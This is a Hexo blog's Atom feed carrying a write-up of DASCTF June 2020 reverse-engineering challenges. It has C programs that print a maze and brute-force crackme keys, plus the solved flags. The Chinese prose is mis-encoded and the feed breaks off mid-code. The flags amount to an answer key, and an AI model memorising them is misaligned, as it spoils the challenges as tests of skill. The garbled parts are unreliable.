<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Bxnop&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.bxnop.cn/"/>
  <updated>2020-06-27T02:50:07.762Z</updated>
  <id>https://www.bxnop.cn/</id>
  
  <author>
    <name>BIX</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2020å¹´DASCTFå…­æœˆçº¿ä¸Šèµ›</title>
    <link href="https://www.bxnop.cn/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    <id>https://www.bxnop.cn/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/</id>
    <published>2020-06-26T04:02:19.000Z</published>
    <updated>2020-06-27T02:50:07.762Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse:"></a>Reverse:</h2><h3 id="T0p-Gear"><a href="#T0p-Gear" class="headerlink" title="T0p Gear"></a>T0p Gear</h3><p>æ˜æ˜æ˜¯ä¸€é“ç­¾åˆ°é¢˜ï¼Œå°±åº”è¯¥æƒ³åˆ°ç®€å•çš„ï¼Œå¼€å§‹åœ¨å“ªé‡Œè§„è§„çŸ©çŸ©çš„åˆ†æå®Œæ•´ä¸ªç¨‹åºã€‚ã€‚ã€‚ä¹Ÿæ˜¯å¤æ‚ï¼Œæœ‰ä¸€ä¸ªAESåŠ å¯†ã€‚å…¶å®æ‰¾åˆ°åœ°å€ï¼Œç›´æ¥GDBåŠ¨è°ƒå°±å¥½äº†ã€‚ã€‚</p><ul><li><p>64ä½elfæ–‡ä»¶åŠ äº†upxå£³ï¼Œè„±å£³åè½½å…¥idaä¸­å‘ç°ä¼ªä»£ç ä¸å¥½çœ‹ï¼Œå°±ç›´æ¥çœ‹æ±‡ç¼–ã€‚å°±ä¸‰ä¸ªæ£€æŸ¥å‡½æ•°ã€‚</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626120857536.png" alt="image-20200626120857536"></p></li><li><p>chk1ï¼šå¯ä»¥çœ‹åˆ°ï¼Œåªè¦çŸ¥é“æ ˆä¸­<strong>rbp-20h</strong>çš„å†…å®¹å³å¯ã€‚è¿™é‡Œç›´æ¥çœ‹æˆ–è€…åŠ¨è°ƒéƒ½ç®€å•ã€‚</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626121531469.png" alt="image-20200626121531469"></p></li><li><p>chk2ï¼šä¸ch1åŒç†ã€‚</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626121844498.png" alt="image-20200626121844498"></p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626125833587-1593226137606.png" alt="image-20200626125833587"></p></li><li><p>chk3ï¼šä¸ä¸ŠåŒç†ã€‚</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626121936155.png" alt="image-20200626121936155"></p></li><li><p>æœ€åå°†å¾—åˆ°çš„æ•°æ®ç»“åˆèµ·æ¥å³å¯ï¼š<strong>c92bb6a5a6c3009124566d882d4bc7ee</strong></p></li><li><p><strong>æ€»ç»“ï¼šå¯¹ç¨‹åºè¦çœ‹çš„é•¿è¿œä¸€ç‚¹å§ã€‚ğŸ˜ª</strong></p></li></ul><h3 id="easy-maze"><a href="#easy-maze" class="headerlink" title="easy_maze"></a>easy_maze</h3><p>æ¯”ç­¾åˆ°é¢˜å¥½æ¥å¤šäº†ã€‚</p><ul><li><p>64ä½elfæ–‡ä»¶ï¼Œè½½å…¥idaä¸­çœ‹ä¸€ä¸‹ï¼ŒçŸ¥é“æ˜¯è¿·å®«é¢˜ï¼Œæ‰€ä»¥ç›®æ ‡æ˜¯æ˜ç¡®çš„ã€‚</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626141730876.png" alt="image-20200626141730876"></p></li><li><p>å¯ä»¥çŸ¥é“åˆšå¼€å§‹åˆ—å’Œè¡Œéƒ½æ˜¯0ï¼Œä¸‹é¢æ‰¾è¿·å®«å›¾ã€‚å…ˆéšä¾¿çœ‹ä¸€ä¸ªæ“ä½œå‡½æ•°ã€‚</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626141924284.png" alt="image-20200626141924284"></p></li><li><p>æŸ¥çœ‹byte_400AE0ï¼šæŠŠæ•°æ®æå–å‡ºæ¥ã€‚</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626142111607.png" alt="image-20200626142111607"></p></li><li><p>ç”¨Cè¯­è¨€å°†å›¾æ‰“å°å‡ºæ¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">35</span>, </span><br><span class="line">   <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c "</span>, ida_chars[<span class="number">10</span>*i+j]);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626142225682.png" alt="image-20200626142225682"></p></li><li><p>ç”±äº0å’ŒOä¸æ˜“åŒºåˆ«ï¼Œè‡ªå·±æŠŠ0æ¢æˆäº†1ã€‚æœ€åä»1ç»•è¿‡Oèµ°åˆ°#å³å¯ã€‚<strong>jkkjjhjjkjjkkkuukukkuuhhhuukkkk</strong> å†mad5åŠ å¯†ä¸€ä¸‹ã€‚</p></li><li><p><strong>æ€»ç»“ï¼šæ— ï¼Œä¸æ˜¯æ–°å¥—è·¯ã€‚</strong></p></li></ul><h3 id="Magia"><a href="#Magia" class="headerlink" title="Magia"></a>Magia</h3><p>æ²¡çœ‹è§é¢˜ç›®çš„æç¤ºï¼Œåœ¨æ‰¾å¯†ç çš„æ—¶å€™æ‰€æœ‰æƒ…å†µè¯•çš„ã€‚ã€‚ã€‚</p><ul><li><p>32ä½PEæ–‡ä»¶ï¼Œé¦–å…ˆæ‰“å¼€çœ‹äº†ä¸‹ï¼Œ æç¤ºè¾“å…¥ä¸€ä¸ªå¯†ç ï¼Œç„¶åéªŒè¯ã€‚idaä¸­çœ‹çœ‹ã€‚</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626205847063.png" alt="image-20200626205847063"></p></li><li><p>æ¥ç€çœ‹ä¸‹é¢ï¼š</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626210117361.png" alt="image-20200626210117361"></p></li><li><p>ç”¨é™åˆ¶æ¡ä»¶å†™çˆ†ç ´è¯•è¯•ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>, v5 = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">33</span>] = &#123;<span class="number">0</span>&#125;, temp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> v11[] = &#123;<span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">13</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> v43[] = &#123;<span class="number">76</span>, <span class="number">101</span>, <span class="number">96</span>, <span class="number">114</span>, <span class="number">100</span>, <span class="number">73</span>, <span class="number">112</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">69</span>, <span class="number">83</span>, <span class="number">97</span>, <span class="number">78</span>, <span class="number">100</span>, <span class="number">72</span>, <span class="number">97</span>&#125;; </span><br><span class="line"><span class="keyword">char</span> v59[] = &#123;<span class="number">51</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">54</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">58</span>, <span class="number">44</span>, <span class="number">8</span>, <span class="number">49</span>, <span class="number">11</span>, <span class="number">55</span>, <span class="number">12</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">31</span>; i &gt; v5; i--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">33</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((j &amp; <span class="number">0xf</span>) == v11[i])</span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">33</span>; k &lt; <span class="number">127</span>; k++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((k &amp; <span class="number">0xf</span>) == v11[v5])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((k^j) == v59[v5] &amp;&amp; (k&amp;j) == v43[v5])</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = j, flag[v5] = k;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">v5++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626210315055.png" alt="image-20200626210315055"></p></li><li><p>å¯ä»¥çœ‹åˆ°ï¼Œæƒ…å†µæ˜¯ä¸å”¯ä¸€çš„ï¼Œä¸ç„¶å¼€å§‹å°±ä¼šæ˜¯Nepäº†ã€‚å…ˆæ¥ç€å¾€ä¸‹çœ‹çœ‹ï¼š</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626211038037.png" alt="image-20200626211038037"></p></li><li><p>å¼€å§‹æ‰¾é‡å†™çš„sub_403000()å‡½æ•°ã€‚å…ˆå¾—åˆ°key[14]çš„æ‰€æœ‰æƒ…å†µï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> v11[] = &#123;<span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">13</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> v43[] = &#123;<span class="number">76</span>, <span class="number">101</span>, <span class="number">96</span>, <span class="number">114</span>, <span class="number">100</span>, <span class="number">73</span>, <span class="number">112</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">69</span>, <span class="number">83</span>, <span class="number">97</span>, <span class="number">78</span>, <span class="number">100</span>, <span class="number">72</span>, <span class="number">97</span>&#125;; </span><br><span class="line"><span class="keyword">char</span> v59[] = &#123;<span class="number">51</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">54</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">58</span>, <span class="number">44</span>, <span class="number">8</span>, <span class="number">49</span>, <span class="number">11</span>, <span class="number">55</span>, <span class="number">12</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">32</span>; i &lt; <span class="number">127</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((i&amp;<span class="number">0xf</span>) == v11[<span class="number">14</span>])</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((j&amp;<span class="number">0xf</span>) == v11[<span class="number">31</span><span class="number">-14</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(((i^j) == v59[<span class="number">14</span>]) &amp;&amp; ((i&amp;j) == v43[<span class="number">14</span>]))</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c%c "</span>, i, j);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626211709542.png" alt="image-20200626211709542"></p></li><li><p>å› ä¸ºæ˜¯æˆå¯¹çš„ï¼Œå°†ä¹‹å‰çš„å¾—åˆ°çš„ä¸å”¯ä¸€çš„keyï¼ŒæŒ‡å®šä½ç½®æ¢æˆè¿™3å¯¹å­—ç¬¦ã€‚ç„¶åè½½å…¥ODï¼Œä¾æ¬¡è¯•ä¸€ä¸‹ï¼Œå‘ç°å½“Oxä¸oXéƒ½ä¼šæŠ¥é”™ï¼Œè€Œ_hæ­£å¸¸æ‰§è¡Œã€‚å¾—åˆ°æ­¤æ—¶çš„ç¨‹åºçŠ¶æ€ådumpå‡ºæ¥ã€‚</p></li><li><p>å°†dumpå‡ºçš„æ–‡ä»¶ï¼Œè½½å…¥idaçœ‹ä¸€ä¸‹é‡å†™çš„å‡½æ•°çš„åŠŸèƒ½ã€‚</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626212512352.png" alt="image-20200626212512352"></p></li><li><p>å› ä¸ºæ²¡çœ‹é¢˜ç›®æç¤ºï¼Œä½¿ç”¨ä¹‹å‰æ‰¾key[14]çš„åŠæ³•ï¼Œæ‰€æœ‰æƒ…å†µè§£å‡ºåçœ‹keyæ€ä¹ˆé¡ºçœ¼ã€‚æœ€åå¾—åˆ°ï¼š<strong>Nep{mircle_and_maho_is_not_free}</strong></p></li><li><p>å…¶å®é¢˜ç›®ç»™äº†æ ¼å¼çš„æç¤ºã€‚ã€‚ã€‚</p></li><li><p>å†è®°å½•ä¸‹idaä¸­v35[i] = â€¦â€¦è¯­å¥çš„åœ°å€ï¼Œè¿›å…¥ODä¸­ä¸‹æ–­ç‚¹ï¼Œç„¶åè¾“å…¥æ­£ç¡®çš„keyï¼Œå¾—åˆ°æœ€ç»ˆflag:</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626212858460.png" alt="image-20200626212858460"></p></li><li><p>æ€»ç»“ï¼šçœ‹æç¤ºå§ã€‚ã€‚ã€‚</p></li></ul><h3 id="521"><a href="#521" class="headerlink" title="521"></a>521</h3><p>åˆæ˜¯C++è¯­æ³•ç±»çš„é€†å‘ï¼Œå‘ç°æœ€è¿‘å¥½å¤šéƒ½æ˜¯ã€‚ã€‚</p><ul><li><p>64ä½elfæ–‡ä»¶ï¼Œè¿è¡Œçœ‹ä¸€ä¸‹ï¼Œç›´æ¥è®©è¾“å…¥flagç„¶åéªŒè¯ã€‚</p></li><li><p>è¿˜æ˜¯è½½å…¥idaï¼š</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626213538336.png" alt="image-20200626213538336"></p></li><li><p>è¿›å…¥v4 = sub_55FE07F79864(a4, (__int64)&amp;v8)ï¼š</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626213804986.png" alt="image-20200626213804986"></p></li><li><p>æ¥ç€çœ‹ä¸‹é¢ï¼š</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626214036174.png" alt="image-20200626214036174"></p></li><li><p>ä¸Šé¢æ ‡é»„çš„æ˜¯æ•´ä¸ªé¢˜çš„å…³é”®å‡½æ•°ï¼Œè¿›å…¥ï¼š</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626214524044.png" alt="image-20200626214524044"></p></li><li><p>idaåŠ¨è°ƒæå–å‡ºæ•°æ®è¡¨ï¼š</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/102BQ%60SD09NF5_648M8$WH.png" alt="img"></p></li><li><p>æœ€åexpï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">128</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">89</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">35</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">53</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">34</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">115</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">141</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">26</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">81</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">93</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">48</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">232</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">87</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span 